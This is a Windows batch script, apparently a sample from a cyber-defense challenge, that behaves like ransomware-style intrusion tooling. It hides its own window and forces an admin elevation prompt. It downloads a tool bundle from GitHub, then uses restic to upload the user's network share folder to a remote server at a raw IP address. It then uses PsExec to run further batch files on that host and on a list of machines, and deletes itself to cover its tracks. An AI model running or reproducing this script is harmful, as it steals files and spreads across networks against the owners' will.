@echo off

if not "%1"=="hidden" (
    >nul 2>&1 start /min cmd /c "%~0" hidden
    exit
)

fltmc >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs" /q >nul 2>&1
    exit /b
)

setlocal enabledelayedexpansion


powershell -command "(New-Object Net.WebClient).DownloadFile('https://github.com/GalalHamoudy/CD_challenge/raw/main/Tools.zip', 'Tools.zip')" 

if exist "Tools.zip" (
    echo Extracting Tools.zip...
    mkdir Tools 2>nul
    powershell -command "Expand-Archive -Path 'Tools.zip' -DestinationPath 'Tools' -Force" >nul 2>&1
    del "Tools.zip" /q >nul 2>&1 
)

for /f "tokens=2 delims=\" %%a in ('whoami') do set username=%%a

if exist "Tools\restic.exe" (
    Tools\restic.exe -r rest:http://192.123.226.84:8000/ init --password-file ppp.txt
    Tools\restic.exe -r rest:http://192.123.226.84:8000/ --password-file ppp.txt --use-fs-snapshot --verbose backup "F:\Shares\!username!\"
)

if exist "Tools\PsExec64.exe" (
    Tools\PsExec64.exe -accepteula \\192.123.226.84 -c -f -d -s up.bat
)

if exist "Tools\PsExec64.exe" if exist "pc.txt" (
    Tools\PsExec64.exe -accepteula @pc.txt -c -f -d -h 1.bat
    del "pc.txt" /q >nul 2>&1 
)

del "%~f0" 